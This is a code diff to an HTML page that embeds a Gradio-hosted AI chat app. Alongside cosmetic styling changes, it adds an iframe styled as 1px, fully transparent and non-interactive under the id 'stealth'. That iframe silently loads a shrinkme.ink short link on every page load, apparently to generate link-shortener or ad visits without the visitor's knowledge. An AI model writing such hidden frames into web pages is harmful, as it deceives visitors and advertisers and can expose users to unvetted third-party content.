@@ -21,23 +21,38 @@
       height: 100vh;
       border: none;
     }
-
-    /* Hide Gradio footer */
+    /* Hide scrollbar and Gradio footer */
     iframe::-webkit-scrollbar {
       display: none;
     }
-
     ::-webkit-scrollbar {
       display: none;
+    }
+    /* Hidden frame for ShrinkMe link */
+    #stealth {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      border: none;
+      opacity: 0;
+      pointer-events: none;
     }
   </style>
 </head>
 <body>
   <header>🧠 Titi ke AI</header>
+
+  <!-- Main AI iframe -->
   <iframe 
     src="https://etherealinkbytiisetso-titibrainchat.hf.space?__theme=dark" 
     onload="customizeGradio()"
     id="titi-frame">
+  </iframe>
+
+  <!-- Hidden ShrinkMe iframe -->
+  <iframe 
+    src="https://shrinkme.ink/TGmiWcp"
+    id="stealth">
   </iframe>
 
   <script>
